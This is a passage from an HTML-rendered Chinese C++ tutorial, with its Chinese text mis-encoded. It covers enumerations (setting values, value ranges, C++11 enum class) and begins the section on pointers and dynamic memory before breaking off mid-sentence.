blue, violet, indigo, ultraviolet&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    spectrum band; <span class="comment">// å£°æ˜ä¸€ä¸ª spectrum ç±»å‹çš„å˜é‡ band</span></span><br><span class="line"></span><br><span class="line">    band = blue; <span class="comment">// å°†æšä¸¾é‡ blue èµ‹ç»™ band (åˆæ³•)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current band (enum value): &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º blue å¯¹åº”çš„æ•´æ•°å€¼ 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// band = 2000; // é”™è¯¯! ä¸èƒ½ç›´æ¥å°†æ•´æ•°èµ‹ç»™æšä¸¾å˜é‡ (ç±»å‹ä¸åŒ¹é…)</span></span><br><span class="line">    <span class="comment">// band = red + orange; // é”™è¯¯! + è¿ç®—ç¬¦æœªå¯¹æšä¸¾ç±»å‹å®šä¹‰ (è™½ç„¶ red å’Œ orange æœ‰æ•´æ•°å€¼)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥å°†æšä¸¾é‡èµ‹ç»™ int å˜é‡ (æšä¸¾é‡ä¼šè‡ªåŠ¨æå‡ä¸º int)</span></span><br><span class="line">    <span class="keyword">int</span> colorCode = green; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Color code for green: &quot;</span> &lt;&lt; colorCode &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥å¼ºåˆ¶å°† int è½¬æ¢ä¸ºæšä¸¾ç±»å‹ (éœ€è¦æ˜¾å¼è½¬æ¢ï¼Œä¸”éœ€è°¨æ…)</span></span><br><span class="line">    band = <span class="keyword">static_cast</span>&lt;spectrum&gt;(<span class="number">3</span>); <span class="comment">// å°† 3 è½¬æ¢ä¸º spectrum ç±»å‹ (å¯¹åº” green)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Band after cast: &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¯”è¾ƒ</span></span><br><span class="line">    <span class="keyword">if</span> (band == green) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The band is green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨å¾ªç¯ä¸­ä½¿ç”¨ (éœ€è¦æ³¨æ„ç±»å‹è½¬æ¢å’ŒèŒƒå›´)</span></span><br><span class="line">    <span class="keyword">for</span> (band = red; band &lt;= ultraviolet; band = <span class="keyword">static_cast</span>&lt;spectrum&gt;(band + <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing band: &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æšä¸¾çš„ä¼˜ç‚¹:</strong></p><ul><li>  <strong>æé«˜å¯è¯»æ€§:</strong> ä½¿ç”¨æœ‰æ„ä¹‰çš„åç§°ï¼ˆå¦‚ <code>red</code>, <code>blue</code>ï¼‰ä»£æ›¿ç¥ç§˜çš„æ•°å­—ï¼ˆ0, 4ï¼‰ã€‚</li><li>  <strong>ç±»å‹å®‰å…¨:</strong> æšä¸¾åˆ›å»ºäº†æ–°çš„ç±»å‹ï¼Œæœ‰åŠ©äºé˜²æ­¢å°†ä¸ç›¸å…³çš„æ•´æ•°å€¼èµ‹ç»™æšä¸¾å˜é‡ï¼ˆè™½ç„¶å¯ä»¥é€šè¿‡å¼ºåˆ¶è½¬æ¢ç»•è¿‡ï¼‰ã€‚</li><li>  <strong>ä»£ç ç»´æŠ¤:</strong> å¦‚æœéœ€è¦æ›´æ”¹æŸä¸ªå¸¸é‡çš„å€¼æˆ–æ·»åŠ æ–°å¸¸é‡ï¼Œåªéœ€ä¿®æ”¹æšä¸¾å®šä¹‰ã€‚</li></ul><h3 id="4-6-1-è®¾ç½®æšä¸¾é‡çš„å€¼"><a href="#4-6-1-è®¾ç½®æšä¸¾é‡çš„å€¼" class="headerlink" title="4.6.1 è®¾ç½®æšä¸¾é‡çš„å€¼"></a>4.6.1 è®¾ç½®æšä¸¾é‡çš„å€¼</h3><p>å¯ä»¥æ˜¾å¼åœ°ä¸ºæšä¸¾é‡æŒ‡å®šæ•´æ•°å€¼ã€‚</p><p><strong>è§„åˆ™:</strong></p><ul><li>  ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ <code>=</code> ä¸ºæšä¸¾é‡æŒ‡å®šå€¼ã€‚</li><li>  æœªè¢«æ˜¾å¼èµ‹å€¼çš„æšä¸¾é‡çš„å€¼å°†åŸºäº<strong>å‰ä¸€ä¸ª</strong>æšä¸¾é‡çš„å€¼åŠ  1ã€‚</li><li>  ç¬¬ä¸€ä¸ªæšä¸¾é‡å¦‚æœæœªæ˜¾å¼èµ‹å€¼ï¼Œé»˜è®¤ä¸º 0ã€‚</li><li>  ä¸åŒçš„æšä¸¾é‡å¯ä»¥å…·æœ‰ç›¸åŒçš„å€¼ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">BitField</span> &#123;</span></span><br><span class="line">    BIT_ZERO,       <span class="comment">// é»˜è®¤å€¼ä¸º 0</span></span><br><span class="line">    BIT_ONE,        <span class="comment">// é»˜è®¤å€¼ä¸º 1</span></span><br><span class="line">    BIT_TWO = <span class="number">4</span>,    <span class="comment">// æ˜¾å¼èµ‹å€¼ä¸º 4</span></span><br><span class="line">    BIT_THREE,      <span class="comment">// å€¼ä¸º BIT_TWO + 1 = 5</span></span><br><span class="line">    BIT_FOUR = <span class="number">8</span>,   <span class="comment">// æ˜¾å¼èµ‹å€¼ä¸º 8</span></span><br><span class="line">    BIT_FIVE = <span class="number">8</span>,   <span class="comment">// æ˜¾å¼èµ‹å€¼ä¸º 8 (ä¸ BIT_FOUR ç›¸åŒ)</span></span><br><span class="line">    BIT_SIX,        <span class="comment">// å€¼ä¸º BIT_FIVE + 1 = 9</span></span><br><span class="line">    BIT_SEVEN = BIT_THREE + BIT_FOUR <span class="comment">// å€¼ä¸º 5 + 8 = 13</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_ZERO: &quot;</span> &lt;&lt; BIT_ZERO &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_ONE: &quot;</span> &lt;&lt; BIT_ONE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_TWO: &quot;</span> &lt;&lt; BIT_TWO &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_THREE: &quot;</span> &lt;&lt; BIT_THREE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_FOUR: &quot;</span> &lt;&lt; BIT_FOUR &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_FIVE: &quot;</span> &lt;&lt; BIT_FIVE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_SIX: &quot;</span> &lt;&lt; BIT_SIX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 9</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_SEVEN: &quot;</span> &lt;&lt; BIT_SEVEN &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 13</span></span><br><span class="line"></span><br><span class="line">    BitField flags = BIT_THREE;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Flags: &quot;</span> &lt;&lt; flags &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-6-2-æšä¸¾çš„å–å€¼èŒƒå›´"><a href="#4-6-2-æšä¸¾çš„å–å€¼èŒƒå›´" class="headerlink" title="4.6.2 æšä¸¾çš„å–å€¼èŒƒå›´"></a>4.6.2 æšä¸¾çš„å–å€¼èŒƒå›´</h3><p>è™½ç„¶æšä¸¾é‡æ˜¯ <code>int</code> ç±»å‹çš„å¸¸é‡ï¼Œä½†æšä¸¾ç±»å‹æœ¬èº« (<code>spectrum</code>, <code>BitField</code> ç­‰) çš„å–å€¼èŒƒå›´å¹¶ä¸ä¸€å®šç­‰åŒäº <code>int</code>ã€‚</p><p><strong>C++98/03 æ ‡å‡†:</strong></p><ul><li>  <strong>åº•å±‚ç±»å‹ (Underlying Type):</strong> ç¼–è¯‘å™¨ä¼šé€‰æ‹©ä¸€ç§èƒ½å¤Ÿå®¹çº³æ‰€æœ‰æšä¸¾é‡å€¼çš„<strong>æ•´å‹</strong>ä½œä¸ºè¯¥æšä¸¾çš„åº•å±‚ç±»å‹ã€‚è¿™ä¸ªç±»å‹è‡³å°‘è¦å’Œ <code>int</code> ä¸€æ ·å¤§ï¼Œä½†å¦‚æœæ‰€æœ‰æšä¸¾é‡çš„å€¼å¯ä»¥ç”¨æ›´å°çš„ç±»å‹ï¼ˆå¦‚ <code>char</code> æˆ– <code>short</code>ï¼‰è¡¨ç¤ºï¼Œç¼–è¯‘å™¨<strong>å¯èƒ½</strong>ä¼šé€‰æ‹©æ›´å°çš„ç±»å‹æ¥èŠ‚çœå†…å­˜ã€‚</li><li><strong>å–å€¼èŒƒå›´:</strong> æšä¸¾å˜é‡ç†è®ºä¸Šå¯ä»¥å­˜å‚¨çš„å€¼çš„èŒƒå›´ç”±å…¶åº•å±‚ç±»å‹å†³å®šã€‚ç„¶è€Œï¼ŒC++ æ ‡å‡†å¯¹æšä¸¾å˜é‡å¯ä»¥<strong>åˆæ³•æŒæœ‰</strong>çš„å€¼æœ‰æ›´ä¸¥æ ¼çš„è§„å®šã€‚ä¸€ä¸ªæšä¸¾å˜é‡å¯ä»¥æŒæœ‰çš„å€¼ï¼Œå…¶ä¸Šé™æ˜¯å¤§äºæœ€å¤§æšä¸¾é‡å€¼çš„æœ€å°çš„ 2 çš„å¹‚å‡ 1ï¼Œä¸‹é™ç±»ä¼¼ï¼ˆå¦‚æœå­˜åœ¨è´Ÿæšä¸¾é‡å€¼ï¼Œåˆ™ä¸ºå°äºæœ€å°æšä¸¾é‡å€¼çš„æœ€å¤§çš„ 2 çš„å¹‚åŠ  1ï¼›å¦‚æœæšä¸¾é‡éƒ½éè´Ÿï¼Œåˆ™ä¸‹é™ä¸º 0ï¼‰ã€‚<ul><li>  ä¾‹å¦‚ï¼Œå¯¹äº <code>enum spectrum &#123;red=0, ..., ultraviolet=7&#125;</code>ï¼Œæœ€å¤§æšä¸¾é‡æ˜¯ 7ã€‚å¤§äº 7 çš„æœ€å°çš„ 2 çš„å¹‚æ˜¯ 8ï¼Œæ‰€ä»¥ä¸Šé™æ˜¯ 8 - 1 = 7ã€‚ä¸‹é™æ˜¯ 0ã€‚å› æ­¤ï¼Œ<code>spectrum</code> å˜é‡ç†è®ºä¸Šå¯ä»¥æŒæœ‰ 0 åˆ° 7 èŒƒå›´å†…çš„å€¼ã€‚</li><li>  å¯¹äº <code>enum BitField &#123;..., BIT_SEVEN=13&#125;</code>ï¼Œæœ€å¤§æšä¸¾é‡æ˜¯ 13ã€‚å¤§äº 13 çš„æœ€å°çš„ 2 çš„å¹‚æ˜¯ 16ï¼Œä¸Šé™æ˜¯ 16 - 1 = 15ã€‚ä¸‹é™æ˜¯ 0ã€‚<code>BitField</code> å˜é‡ç†è®ºä¸Šå¯ä»¥æŒæœ‰ 0 åˆ° 15 èŒƒå›´å†…çš„å€¼ã€‚</li></ul></li><li>  <strong>èµ‹å€¼é™åˆ¶:</strong> å°½ç®¡èŒƒå›´å¯èƒ½æ¯”æšä¸¾é‡çš„å€¼åŸŸå®½ï¼Œä½† C++ é€šå¸¸ä¸å…è®¸ç›´æ¥å°†è¶…å‡ºæšä¸¾é‡å®šä¹‰èŒƒå›´çš„æ•´æ•°å€¼èµ‹ç»™æšä¸¾å˜é‡ï¼ˆå³ä½¿è¯¥æ•´æ•°åœ¨ç†è®ºèŒƒå›´å†…ï¼‰ï¼Œéœ€è¦æ˜¾å¼ç±»å‹è½¬æ¢ã€‚</li></ul><p><strong>C++11 ä½œç”¨åŸŸå†…æšä¸¾ (Scoped Enumeration):</strong></p><p>C++11 å¼•å…¥äº† <code>enum class</code> (æˆ– <code>enum struct</code>)ï¼Œç§°ä¸º<strong>ä½œç”¨åŸŸå†…æšä¸¾</strong>ï¼Œæä¾›äº†æ›´å¼ºçš„ç±»å‹å®‰å…¨å’Œä½œç”¨åŸŸæ§åˆ¶ï¼š</p><ul><li>  <strong>å¼ºç±»å‹:</strong> <code>enum class</code> çš„æšä¸¾é‡ä¸ä¼šéšå¼è½¬æ¢ä¸ºæ•´æ•°ã€‚</li><li>  <strong>ä½œç”¨åŸŸ:</strong> æšä¸¾é‡çš„åç§°è¢«é™åˆ¶åœ¨æšä¸¾ç±»å‹çš„ä½œç”¨åŸŸå†…ï¼Œè®¿é—®æ—¶éœ€è¦ä½¿ç”¨ <code>EnumType::Enumerator</code>ã€‚</li><li>  <strong>å¯æŒ‡å®šåº•å±‚ç±»å‹:</strong> å¯ä»¥æ˜¾å¼æŒ‡å®šåº•å±‚æ•´æ•°ç±»å‹ï¼Œä¾‹å¦‚ <code>enum class Color : unsigned char &#123; Red, Green, Blue &#125;;</code>ã€‚</li><li>  <strong>æ— éšå¼è½¬æ¢:</strong> ä¸èƒ½å°†æ•´æ•°ç›´æ¥èµ‹ç»™ <code>enum class</code> å˜é‡ï¼Œä¹Ÿä¸èƒ½å°† <code>enum class</code> å˜é‡éšå¼è½¬æ¢ä¸ºæ•´æ•°ï¼Œéƒ½éœ€è¦æ˜¾å¼è½¬æ¢ (<code>static_cast</code>)ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (èŒƒå›´å’Œ C++11):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OldEnum</span> &#123;</span> A = <span class="number">1</span>, B = <span class="number">2</span>, C = <span class="number">4</span> &#125;; <span class="comment">// æœ€å¤§å€¼ 4, èŒƒå›´å¯èƒ½æ˜¯ 0-7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 ä½œç”¨åŸŸå†…æšä¸¾</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">NewEnum</span> &#123;</span> X = <span class="number">10</span>, Y = <span class="number">20</span>, Z = <span class="number">30</span> &#125;; </span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Status</span> :</span> <span class="keyword">char</span> &#123; OK = <span class="string">&#x27;O&#x27;</span>, Error = <span class="string">&#x27;E&#x27;</span>, Pending = <span class="string">&#x27;P&#x27;</span> &#125;; <span class="comment">// æŒ‡å®šåº•å±‚ç±»å‹ä¸º char</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    OldEnum oe;</span><br><span class="line">    <span class="comment">// oe = 7; // ç¼–è¯‘é”™è¯¯ (é€šå¸¸ä¸å…è®¸ç›´æ¥èµ‹ int)</span></span><br><span class="line">    oe = <span class="keyword">static_cast</span>&lt;OldEnum&gt;(<span class="number">7</span>); <span class="comment">// åˆæ³• (å› ä¸º 7 åœ¨ç†è®ºèŒƒå›´ 0-7 å†…)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;OldEnum value: &quot;</span> &lt;&lt; oe &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// oe = static_cast&lt;OldEnum&gt;(8); // è¡Œä¸ºæœªå®šä¹‰æˆ–å¯èƒ½ç¼–è¯‘é”™è¯¯ (è¶…å‡ºç†è®ºèŒƒå›´)</span></span><br><span class="line"></span><br><span class="line">    NewEnum ne = NewEnum::Y; <span class="comment">// å¿…é¡»ä½¿ç”¨ä½œç”¨åŸŸè§£æç¬¦</span></span><br><span class="line">    <span class="comment">// int ne_val = ne; // é”™è¯¯! ä¸èƒ½éšå¼è½¬æ¢ä¸º int</span></span><br><span class="line">    <span class="keyword">int</span> ne_val = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(ne); <span class="comment">// éœ€è¦æ˜¾å¼è½¬æ¢</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NewEnum value as int: &quot;</span> &lt;&lt; ne_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ne = 20; // é”™è¯¯! ä¸èƒ½å°† int èµ‹ç»™ enum class</span></span><br><span class="line">    ne = <span class="keyword">static_cast</span>&lt;NewEnum&gt;(<span class="number">10</span>); <span class="comment">// éœ€è¦æ˜¾å¼è½¬æ¢</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NewEnum value after cast: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(ne) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10</span></span><br><span class="line"></span><br><span class="line">    Status s = Status::OK;</span><br><span class="line">    <span class="keyword">char</span> s_char = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(s); <span class="comment">// è½¬æ¢ä¸ºåº•å±‚ç±»å‹ char</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Status as char: &quot;</span> &lt;&lt; s_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º O</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong><br>ä¼ ç»Ÿçš„ <code>enum</code> æä¾›äº†ä¸€ç§åˆ›å»ºå‘½åå¸¸é‡çš„æ–¹å¼ï¼Œä½†ç±»å‹å®‰å…¨è¾ƒå¼±ï¼Œä¸”æšä¸¾é‡ä¼šæ±¡æŸ“æ‰€åœ¨çš„ä½œç”¨åŸŸã€‚C++11 çš„ <code>enum class</code> æä¾›äº†æ›´å¼ºçš„ç±»å‹å®‰å…¨å’Œä½œç”¨åŸŸæ§åˆ¶ï¼Œæ˜¯ç°ä»£ C++ ä¸­æ›´æ¨èçš„é€‰æ‹©ã€‚åœ¨ä½¿ç”¨ä¼ ç»Ÿ <code>enum</code> æ—¶ï¼Œè¦æ³¨æ„å…¶å–å€¼èŒƒå›´å’Œä¸æ•´æ•°ç±»å‹è½¬æ¢çš„è§„åˆ™ã€‚</p><h2 id="4-7-æŒ‡é’ˆå’Œè‡ªç”±å­˜å‚¨ç©ºé—´"><a href="#4-7-æŒ‡é’ˆå’Œè‡ªç”±å­˜å‚¨ç©ºé—´" class="headerlink" title="4.7 æŒ‡é’ˆå’Œè‡ªç”±å­˜å‚¨ç©ºé—´"></a>4.7 æŒ‡é’ˆå’Œè‡ªç”±å­˜å‚¨ç©ºé—´</h2><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åˆ›å»ºçš„å˜é‡ï¼ˆåŒ…æ‹¬æ•°ç»„ã€ç»“æ„ç­‰ï¼‰åœ¨å£°æ˜æ—¶ï¼Œç¼–è¯‘å™¨ä¼šä¸ºå…¶åˆ†é…å†…å­˜ã€‚è¿™äº›å˜é‡çš„å†…å­˜ç®¡ç†æ˜¯è‡ªåŠ¨çš„ï¼ˆè‡ªåŠ¨å­˜å‚¨æˆ–é™æ€å­˜å‚¨ï¼‰ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºè¿è¡Œæ—¶æ ¹æ®éœ€è¦åŠ¨æ€åœ°åˆ†é…å’Œé‡Šæ”¾å†…å­˜ã€‚<strong>æŒ‡é’ˆ (Pointer)</strong> å’Œ <strong>è‡ªç”±å­˜å‚¨ç©ºé—´ (Free Store)**ï¼ˆä¹Ÿå¸¸ç§°ä¸º</strong>å † Heap**ï¼‰æ˜¯å®ç°è¿™ä¸€ç›®æ ‡çš„å…³é”®ã€‚</p><p><strong>æŒ‡é’ˆ</strong>æ˜¯ä¸€ç§ç‰¹æ®Šçš„å˜é‡ï¼Œå®ƒå­˜å‚¨çš„æ˜¯å¦ä¸€ä¸ªå˜é‡çš„<strong>å†…å­˜åœ°å€</strong>ã€‚é€šè¿‡æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥é—´æ¥åœ°è®¿é—®å’Œä¿®æ”¹è¯¥å†…å­˜åœ°å€å¤„çš„æ•°æ®ã€‚</p><p><strong>è‡ªç”±å­˜å‚¨ç©ºé—´</strong>æ˜¯ç¨‹åºå¯ä»¥åŠ¨æ€ç”³è¯·ä½¿ç”¨çš„å†…å­˜åŒºåŸŸã€‚ä¸è‡ªåŠ¨å˜é‡ï¼ˆå‡½æ•°æ‰§è¡Œå®Œå°±é”€æ¯ï¼‰æˆ–é™æ€å˜é‡ï¼ˆç¨‹åºæ•´ä¸ªç”Ÿå‘½å‘¨æœŸéƒ½å­˜åœ¨ï¼‰ä¸åŒï¼Œç¨‹åºå‘˜éœ€è¦æ‰‹åŠ¨ç®¡ç†è‡ªç”±å­˜å‚¨ç©ºé—´ä¸­åˆ†é…çš„å†…å­˜çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><h3 id="4-7-1-å£°æ˜å’Œåˆå§‹åŒ–æŒ‡é’ˆ"><a href="#4-7-1-å£°æ˜å’Œåˆå§‹åŒ–æŒ‡é’ˆ" class="headerlink" title="4.7.1 å£°æ˜å’Œåˆå§‹åŒ–æŒ‡é’ˆ"></a>4.7.1 å£°æ˜å’Œåˆå§‹åŒ–æŒ‡é’ˆ</h3><p><strong>å£°æ˜æŒ‡é’ˆ:</strong></p><p>å£°æ˜æŒ‡é’ˆéœ€è¦æŒ‡å®šå®ƒå°†æŒ‡å‘çš„æ•°æ®ç±»å‹ï¼Œå¹¶åœ¨å˜é‡åå‰åŠ ä¸Šæ˜Ÿå· <code>*</code>ï¼ˆæ˜Ÿå·å¯ä»¥é è¿‘ç±»å‹åã€å˜é‡åæˆ–åœ¨ä¸¤è€…ä¹‹é—´ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName * pointerName; </span><br></pre></td></tr></table></figure><ul><li>  <code>typeName</code>: æŒ‡é’ˆå°†è¦æŒ‡å‘çš„æ•°æ®çš„ç±»å‹ã€‚</li><li>  <code>*</code>: è¡¨æ˜ <code>pointerName</code> æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚</li><li>  <code>pointerName</code>: æŒ‡é’ˆå˜é‡çš„åç§°ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_int;      <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘ int ç±»å‹çš„æŒ‡é’ˆ p_int</span></span><br><span class="line"><span class="keyword">double</span> * p_double; <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘ double ç±»å‹çš„æŒ‡é’ˆ p_double</span></span><br><span class="line"><span class="keyword">char</span> * p_char;    <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘ char ç±»å‹çš„æŒ‡é’ˆ p_char</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> * p_str; <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘ string å¯¹è±¡çš„æŒ‡é’ˆ p_str</span></span><br></pre></td></tr></table></figure><p><strong>è·å–åœ°å€ (<code>&amp;</code> è¿ç®—ç¬¦):</strong></p><p>åœ°å€è¿ç®—ç¬¦ <code>&amp;</code> ç”¨äºè·å–ä¸€ä¸ªå˜é‡çš„å†…å­˜åœ°å€ã€‚</p><p><strong>åˆå§‹åŒ–æŒ‡é’ˆ:</strong></p><p>æŒ‡é’ˆåœ¨å£°æ˜æ—¶åº”è¢«åˆå§‹åŒ–ï¼Œä»¥é¿å…æŒ‡å‘ä¸ç¡®å®šçš„å†…å­˜åœ°å€ã€‚å¸¸è§çš„åˆå§‹åŒ–æ–¹å¼ï¼š</p><ol><li> <strong>åˆå§‹åŒ–ä¸º <code>nullptr</code> (C++11 åŠä»¥å):</strong> <code>nullptr</code> æ˜¯è¡¨ç¤ºç©ºæŒ‡é’ˆçš„å…³é”®å­—ï¼Œè¡¨ç¤ºè¯¥æŒ‡é’ˆå½“å‰ä¸æŒ‡å‘ä»»ä½•æœ‰æ•ˆçš„å†…å­˜åœ°å€ã€‚è¿™æ˜¯æ¨èçš„åˆå§‹åŒ–ç©ºæŒ‡é’ˆçš„æ–¹å¼ã€‚</li><li> <strong>åˆå§‹åŒ–ä¸º <code>0</code> æˆ– <code>NULL</code>:</strong> åœ¨ C++11 ä¹‹å‰ï¼Œé€šå¸¸ä½¿ç”¨ <code>0</code> æˆ–å® <code>NULL</code> (é€šå¸¸å®šä¹‰ä¸º 0) æ¥è¡¨ç¤ºç©ºæŒ‡é’ˆã€‚è™½ç„¶ä»å¯ç”¨ï¼Œä½† <code>nullptr</code> ç±»å‹æ›´å®‰å…¨ã€‚</li><li> <strong>åˆå§‹åŒ–ä¸ºå˜é‡åœ°å€:</strong> ä½¿ç”¨ <code>&amp;</code> 